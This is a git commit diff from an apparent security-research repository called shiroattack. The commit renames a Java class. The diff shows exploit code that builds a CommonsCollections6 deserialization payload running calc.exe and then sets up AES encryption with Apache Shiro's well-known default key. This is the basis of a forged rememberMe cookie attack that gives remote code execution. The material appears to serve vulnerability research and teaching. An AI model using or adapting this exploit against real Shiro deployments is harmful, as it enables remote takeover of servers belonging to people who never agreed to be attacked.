91f70b00fa3535a650c9a68e26250ea916c6526c
phith0n <phith0n.ph2f@gmail.com>
2021-03-26 04:16:16 +0800

    rename

--- shiroattack/src/main/java/com/govuln/shiroattack/Client0.java
+++ shiroattack/src/main/java/com/govuln/shiroattack/Client0.java
@@ -3,10 +3,8 @@ package com.govuln.shiroattack;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.util.ByteSource;
 
-public class Wrong {
+public class Client0 {
     public static void main(String []args) throws Exception {
-
-        // byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("D:\\pro\\ysoserial\\poc.ser"));
         byte[] payloads = new CommonsCollections6().getPayload("calc.exe");
         AesCipherService aes = new AesCipherService();
         byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
